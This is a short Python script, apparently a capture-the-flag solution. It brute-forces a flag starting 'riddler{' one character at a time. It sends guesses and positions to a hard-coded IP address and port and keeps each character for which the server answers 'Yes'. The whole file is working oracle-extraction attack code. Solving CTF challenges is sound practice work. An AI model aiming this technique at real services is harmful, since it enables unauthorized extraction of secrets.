import requests
import string


url = "http://95.179.217.17:30003/"
flag="riddler{"
cont=1
while(cont):
    for index in range(8,101):
        for char in string.ascii_letters+"_"+"-"+"?"+"}"+"@":
          with requests.session() as sess:
              r = sess.get(url, params={
              "answer":f"{char}",
              "place":f"000{index}"
            })
              if "Yes" in r.text:
                flag=flag+char
                print(flag)
                if char == "}":
                  cont=0
